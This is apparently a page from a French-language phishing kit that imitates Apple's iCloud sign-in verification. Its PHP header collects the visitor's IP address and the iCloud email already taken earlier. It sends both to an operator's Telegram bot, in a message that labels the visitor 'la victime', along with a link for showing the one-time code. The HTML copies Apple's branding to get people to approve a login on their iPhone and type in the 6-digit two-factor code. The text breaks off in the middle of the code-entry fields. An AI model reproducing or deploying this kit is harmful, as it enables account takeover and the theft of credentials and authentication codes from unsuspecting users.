<?php
session_start();
include __DIR__ . '/settings.php';
include __DIR__ . '/lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(2);

function _pushGetIp() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
    }
    return 'N/A';
}

if (empty($_SESSION['push_notif_sent'])) {
    $_SESSION['push_notif_sent'] = true;
    $ip    = _pushGetIp();
    $email = $_SESSION['icloud_email'] ?? '—';
    $dt    = date('d/m/Y à H:i') . ' UTC';

    $proto  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host   = $_SERVER['HTTP_HOST'];
    $dir    = dirname($_SERVER['PHP_SELF']);
    if ($dir === '/' || $dir === '\\') $dir = '';
    $vbvUrl = $proto . '://' . $host . $dir . '/security_check/actionsvbv.php';
    $encIp  = urlencode($ip);

    $msg = <<<TEXT
📱 <b>iCLOUD – Notification envoyée</b>

<b>Apple ID</b>
└ 📧 Email: <code>$email</code>

<b>Réseau</b>
├ 🌐 IP: <code>$ip</code>
└ 🕐 $dt

⏳ <i>La victime doit accepter sur son iPhone…</i>
TEXT;
    $keyboard = ['inline_keyboard' => [[
        ['text' => '📲 AFFICHER LE CODE', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=showcode'],
    ]]];
    // Fire-and-forget : n'attend pas la réponse Telegram, la page se charge immédiatement
    sendTelegramAsync($bot_token, $chat_id, $msg, $keyboard);
}
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <title>iCloud</title>
  <link rel="stylesheet" href="https://www.apple.com/wss/fonts/?families=SF+Pro,v3" media="all">
  <style>
    :root {
      --bg: #f2f2f7;
      --card-bg: #ffffff;
      --card-shadow: 0 2px 24px rgba(0,0,0,0.10);
      --label: rgba(0,0,0,0.88);
      --label-secondary: rgba(60,60,67,0.6);
      --separator: rgba(60,60,67,0.22);
      --fill-tertiary: rgba(118,118,128,0.12);
      --blue: #0071e3;
      --blue-tint: rgba(0,122,255,1);
      --input-border: rgba(0,0,0,0.18);
      --theme-color-systemBlack: rgba(0,0,0,0.88);
      --green: #34c759;
    }
    @media (prefers-color-scheme: dark) {
      :root {
        --bg: rgb(28,28,30);
        --card-bg: rgb(44,44,46);
        --card-shadow: 0 4px 32px rgba(0,0,0,0.45);
        --label: rgba(255,255,255,0.98);
        --label-secondary: rgba(235,235,245,0.6);
        --separator: rgba(84,84,88,0.65);
        --fill-tertiary: rgba(118,118,128,0.24);
        --blue: #0a84ff;
        --blue-tint: rgba(10,132,255,1);
        --input-border: rgba(255,255,255,0.18);
        --theme-color-systemBlack: #ffffff;
        --green: #30d158;
      }
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html { background-color: var(--bg); }
    body {
      background: var(--bg);
      color: var(--label);
      font-family: -apple-system, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
      min-height: 100dvh;
      display: flex;
      flex-direction: column;
    }

    /* ── NAV ── */
    .nav {
      position: relative; top: 0; left: 0;
      width: 100%; height: 44px;
      display: flex; align-items: center;
      padding: 0 16px; flex-shrink: 0;
    }
    .nav-brand {
      display: flex; align-items: center; gap: 5px;
      font-size: 17px; font-weight: 600;
      color: var(--label); text-decoration: none; letter-spacing: -0.3px;
    }
    .nav-brand svg { fill: var(--label); flex-shrink: 0; }
    .nav-spacer { flex: 1; }
    .nav-ellipsis {
      background: none; border: none; cursor: pointer;
      padding: 8px; display: flex; align-items: center;
      justify-content: center; opacity: 0.6;
    }
    .nav-ellipsis:hover { opacity: 1; }
    .nav-ellipsis svg { fill: var(--label); }

    /* ── MAIN ── */
    .main {
      flex: 1; display: flex; flex-direction: column;
      align-items: center; justify-content: flex-start;
      padding: 32px 16px 48px; width: 100%;
    }
    .content-wrap {
      width: 100%; max-width: 360px;
      display: flex; flex-direction: column;
      align-items: center;
      background: var(--card-bg);
      border-radius: 20px;
      padding: 36px 24px 30px;
      box-shadow: var(--card-shadow);
    }

    /* ── PHASE CONTAINERS ── */
    .phases-stack { display: grid; width: 100%; }
    .phases-stack > .phase { grid-area: 1 / 1; }
    .phase {
      width: 100%;
      display: flex; flex-direction: column; align-items: center;
      transition: opacity 0.42s ease, transform 0.42s ease;
    }
    .phase.hidden {
      opacity: 0; transform: translateY(10px);
      pointer-events: none;
    }

    /* ── RING ── */
    .ring-wrap { width: 120px; height: 120px; margin-bottom: 20px; flex-shrink: 0; }

    /* ── TITLES ── */
    h1 {
      font-size: 22px; font-weight: 700; color: var(--label);
      text-align: center; line-height: 1.25; letter-spacing: -0.3px;
      margin-bottom: 12px; width: 100%;
    }
    .subtitle {
      font-size: 14px; color: var(--label-secondary);
      text-align: center; line-height: 1.5;
      margin-bottom: 28px; max-width: 280px;
    }

    /* ── iOS SPINNER ── */
    .ios-activity {
      position: relative; width: 36px; height: 36px;
      margin-bottom: 24px;
    }
    .ios-activity .blade {
      position: absolute; left: 50%; top: 3px;
      width: 2.5px; height: 8px; margin-left: -1.25px;
      background: var(--label); border-radius: 1.5px;
      transform-origin: center 15px;
      opacity: 0.08;
      animation: ios-b 1.2s linear infinite;
    }
    @keyframes ios-b { 0%{opacity:1} 100%{opacity:0.08} }
    .ios-activity .blade:nth-child(1)  { transform:rotate(  0deg); animation-delay:  0s;  }
    .ios-activity .blade:nth-child(2)  { transform:rotate( 30deg); animation-delay:-1.1s; }
    .ios-activity .blade:nth-child(3)  { transform:rotate( 60deg); animation-delay:-1.0s; }
    .ios-activity .blade:nth-child(4)  { transform:rotate( 90deg); animation-delay:-0.9s; }
    .ios-activity .blade:nth-child(5)  { transform:rotate(120deg); animation-delay:-0.8s; }
    .ios-activity .blade:nth-child(6)  { transform:rotate(150deg); animation-delay:-0.7s; }
    .ios-activity .blade:nth-child(7)  { transform:rotate(180deg); animation-delay:-0.6s; }
    .ios-activity .blade:nth-child(8)  { transform:rotate(210deg); animation-delay:-0.5s; }
    .ios-activity .blade:nth-child(9)  { transform:rotate(240deg); animation-delay:-0.4s; }
    .ios-activity .blade:nth-child(10) { transform:rotate(270deg); animation-delay:-0.3s; }
    .ios-activity .blade:nth-child(11) { transform:rotate(300deg); animation-delay:-0.2s; }
    .ios-activity .blade:nth-child(12) { transform:rotate(330deg); animation-delay:-0.1s; }

    /* ── PHONE ICON (phase 1) ── */
    .phone-icon-wrap { position: relative; margin-bottom: 22px; }
    .phone-icon-wrap svg { display: block; }
    .phone-badge {
      position: absolute; top: -5px; right: -5px;
      width: 20px; height: 20px;
      background: #ff3b30; border-radius: 50%;
      border: 2.5px solid var(--card-bg);
      display: flex; align-items: center; justify-content: center;
      font-size: 10px; font-weight: 800; color: #fff; line-height: 1;
    }

    /* ── STEP LIST (phase 1) ── */
    .step-list {
      width: 100%; display: flex; flex-direction: column; gap: 9px;
      margin-bottom: 22px;
    }
    .step-item {
      display: flex; align-items: center; gap: 13px;
      padding: 12px 14px;
      background: var(--fill-tertiary);
      border-radius: 13px;
    }
    .step-num {
      width: 28px; height: 28px; flex-shrink: 0;
      background: var(--blue-tint); border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 13px; font-weight: 700; color: #fff;
    }
    .step-text { font-size: 14px; color: var(--label); line-height: 1.4; flex: 1; }
    .step-text b { font-weight: 700; }

    /* ── AUTHORIZED BUTTON (phase 1) ── */
    .btn-authorized {
      width: 100%;
      background: var(--blue-tint); color: #fff;
      border: none; border-radius: 14px;
      padding: 14px 20px; font-size: 16px; font-weight: 600;
      font-family: inherit; cursor: pointer; -webkit-appearance: none;
      transition: opacity 0.15s; letter-spacing: -0.2px;
    }
    .btn-authorized:active { opacity: 0.82; }

    /* ── PHASE 2: CODE INPUT ── */
    .code-label {
      font-size: 14px; color: var(--label-secondary);
      text-align: center; margin-bottom: 20px;
      line-height: 1.5;
    }
    .code-inputs {
      display: flex; gap: 8px; margin-bottom: 8px;
      justify-content: center;
    }
    .digit-input {
      width: 44px; height: 54px;
      font-size: 24px; font-weight: 600;
      text-align: center;
      background: var(--fill-tertiary);
      border: 1.5px solid var(--input-border);
      border-radius: 12px;
      color: var(--label);
      font-family: inherit;
      outline: none;
      caret-color: transparent;
      -webkit-appearance: none;
      transition: border-color 0.2s, background 0.2s;
    }
    .digit-input:focus {
      border-color: var(--blue);
      background: var(--card-bg);
    }
    .digit-input.filled { border-color: var(--blue); }

    .error-msg {
      font-size: 13px; color: #ff3b30;
      font-weight: 500; text-align: center;
      margin: 4px 0 12px; display: none;
    }

    .btn-verify {
      width: 100%;
      background: var(--blue); color: #fff;
      border: none; border-radius: 12px;
      padding: 13px 10px; font-size: 16px;
      font-weight: 600; font-family: inherit;
      cursor: pointer; -webkit-appearance: none;
      transition: opacity 0.15s;
      letter-spacing: -0.2px; margin-top: 8px;
    }
    .btn-verify:disabled { opacity: 0.45; cursor: default; }
    .btn-verify:not(:disabled):active { opacity: 0.8; }

    .alt-link {
      display: block; text-align: center;
      font-size: 14px; color: var(--blue-tint);
      text-decoration: none; margin-top: 16px;
    }
    .alt-link:hover { text-decoration: underline; }

    /* ── LOADING OVERLAY (phase 3) ── */
    #loadingOverlay {
      position: fixed; inset: 0;
      background: var(--bg);
      display: none; align-items: center; justify-content: center;
      padding: 16px; opacity: 0;
      transition: opacity 0.35s cubic-bezier(0.4,0,0.2,1);
      z-index: 9999;
    }
    .loading-card {
      width: 100%; max-width: 360px;
      background: var(--card-bg);
      border-radius: 20px; padding: 36px 24px 32px;
      box-shadow: var(--card-shadow);
      display: flex; flex-direction: column; align-items: center;
    }
    .loading-ring { width: 100px; height: 100px; margin-bottom: 22px; }
    .loading-title { font-size: 20px; font-weight: 700; color: var(--label); letter-spacing: -0.3px; margin: 0 0 8px; text-align: center; }
    .loading-sub { font-size: 14px; color: var(--label-secondary); margin: 0; text-align: center; max-width: 230px; line-height: 1.45; }

    /* ── FOOTER ── */
    .site-footer {
      flex-shrink: 0; width: 100%;
      padding: 20px 24px;
      display: flex; justify-content: space-between;
      align-items: center; flex-wrap: wrap; gap: 8px;
    }
    .footer-links { display: flex; gap: 12px; flex-wrap: wrap; }
    .footer-links a { font-size: 12px; color: var(--label-secondary); text-decoration: none; }
    .footer-links a:hover { text-decoration: underline; }
    .footer-copy { font-size: 12px; color: var(--label-secondary); }
  </style>
</head>
<body>

  <!-- NAV -->
  <nav class="nav">
    <a class="nav-brand" href="#">
      <svg xmlns="http://www.w3.org/2000/svg" width="84" height="23" viewBox="0 0 85 23" fill="currentColor" style="overflow:visible">
        <path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" transform="translate(2.5 6.5)"/>
      </svg>
    </a>
    <div class="nav-spacer"></div>
    <button class="nav-ellipsis" aria-label="Plus d'options">
      <svg viewBox="0 0 64 14" xmlns="http://www.w3.org/2000/svg" width="28" height="7">
        <circle cx="7" cy="7" r="6.3"/>
        <circle cx="32" cy="7" r="6.3"/>
        <circle cx="57" cy="7" r="6.3"/>
      </svg>
    </button>
  </nav>

  <!-- MAIN -->
  <main class="main">
    <div class="content-wrap">

      <!-- Ring -->
      <div class="ring-wrap">
        <svg viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="120" height="120" aria-hidden="true">
          <defs>
            <linearGradient x1="100%" y1="100%" x2="50%" y2="50%" id="pg-a"><stop stop-color="#8700FF" offset="0%"/><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/></linearGradient>
            <linearGradient x1="0%" y1="100%" x2="50%" y2="50%" id="pg-b"><stop stop-color="#E00" offset="0%"/><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"/></linearGradient>
            <linearGradient x1="100%" y1="0%" x2="50%" y2="50%" id="pg-c"><stop stop-color="#00B1EE" offset="0%"/><stop stop-color="#00B1EE" stop-opacity="0" offset="100%"/></linearGradient>
            <linearGradient x1="-17.876%" y1="21.021%" x2="48.935%" y2="50%" id="pg-d"><stop stop-color="#FFA456" offset="0%"/><stop stop-color="#FFA456" stop-opacity="0" offset="100%"/></linearGradient>
            <path id="pg-dots" d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z"/>
          </defs>
          <use fill="#FFF" xlink:href="#pg-dots"/>
          <use fill="url(#pg-a)" xlink:href="#pg-dots"/>
          <use fill="url(#pg-b)" xlink:href="#pg-dots"/>
          <use fill="url(#pg-c)" xlink:href="#pg-dots"/>
          <use fill="url(#pg-d)" xlink:href="#pg-dots"/>
          <path fill="var(--theme-color-systemBlack)" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"/>
        </svg>
      </div>

      <div class="phases-stack">

      <!-- ── PHASE 1 : notification envoyée ── -->
      <div id="phase1" class="phase">

        <div class="phone-icon-wrap" aria-hidden="true">
          <svg width="60" height="60" viewBox="0 0 60 60" fill="none">
            <rect x="13" y="3" width="34" height="54" rx="8" stroke="var(--label)" stroke-width="2" opacity="0.2"/>
            <rect x="14" y="4" width="32" height="52" rx="7.5" fill="var(--label)" opacity="0.05"/>
            <rect x="22" y="7" width="16" height="3" rx="1.5" fill="var(--label)" opacity="0.25"/>
            <rect x="25" y="51" width="10" height="2.5" rx="1.25" fill="var(--label)" opacity="0.18"/>
            <!-- Bell icon – improved -->
            <circle cx="30" cy="30" r="13" fill="var(--blue-tint)" opacity="0.1"/>
            <circle cx="30" cy="18" r="2.2" fill="none" stroke="var(--blue-tint)" stroke-width="1.7" opacity="0.92"/>
            <line x1="30" y1="20.2" x2="30" y2="22" stroke="var(--blue-tint)" stroke-width="1.7" stroke-linecap="round" opacity="0.92"/>
            <path d="M21 37.5 L21.5 37.5 C22.5 37.5 23 37 23 35.5 C23 29.5 26 22 30 22 C34 22 37 29.5 37 35.5 C37 37 37.5 37.5 38.5 37.5 L39 37.5 L39 39 L21 39 Z" fill="var(--blue-tint)" opacity="0.9"/>
            <path d="M27.5 39.3 Q27.2 42 30 42 Q32.8 42 32.5 39.3" stroke="var(--blue-tint)" stroke-width="1.8" fill="none" stroke-linecap="round" opacity="0.9"/>
          </svg>
          <div class="phone-badge">1</div>
        </div>

        <h1 id="p1-title">Vérification requise</h1>
        <p class="subtitle">Une demande de connexion a été détectée. Confirmez qu'il s'agit bien de vous.</p>

        <div class="step-list">
          <div class="step-item">
            <span class="step-num">!</span>
            <span class="step-text">Appuyez sur <b>Autoriser</b> sur votre iPhone pour confirmer votre identité</span>
          </div>
        </div>

        <button class="btn-authorized" id="btnAuthorized" type="button">
          J'ai autorisé — Entrer le code reçu
        </button>

      </div>

      <!-- ── PHASE 2 : saisie du code ── -->
      <div id="phase2" class="phase hidden">
        <h1>Saisissez le code<br>de vérification</h1>
        <p class="subtitle">Entrez le code à 6&nbsp;chiffres qui s'est affiché sur votre iPhone après avoir appuyé sur Autoriser.</p>

        <div class="code-inputs" id="codeInputs" role="group" aria-label="Code de vérification à 6 chiffres">
          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="digit-input" autocomplete="one-time-code" aria-label="Chiffre 1"/>
          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="digit-input" aria-label="Chiffre 2"/>
          <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="digit-input" aria-label="Chiffre 3"/>
